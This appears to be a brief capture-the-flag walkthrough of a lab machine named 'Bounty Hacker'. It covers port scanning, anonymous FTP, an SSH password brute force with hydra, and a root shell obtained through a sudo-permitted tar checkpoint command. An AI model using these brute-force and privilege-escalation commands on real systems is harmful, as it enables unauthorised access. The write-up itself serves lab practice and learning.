# Bounty Hacker

## 1. nmap scan
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

## 2. gobuster scan
/images

## 3. ftp anonymous login
We find some files with the name "lin" and a list of passwords "locks.txt"

## 4. brute force with hydra
> hydra -l lin -P /usr/share/wordlists/rockyou.txt <IP> ssh -t 4
  --> now we got the password and we can login into ssh
> ssh lin@<IP>

## 5. Privesc
> find / -perm  -u=s -type f 2>/dev/null
We find "/usr/bin/sudo", lets type:
> sudo -l
and we find "/bin/tar", so we search on https://gtfobins.github.io/ for tar and get following line.
> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

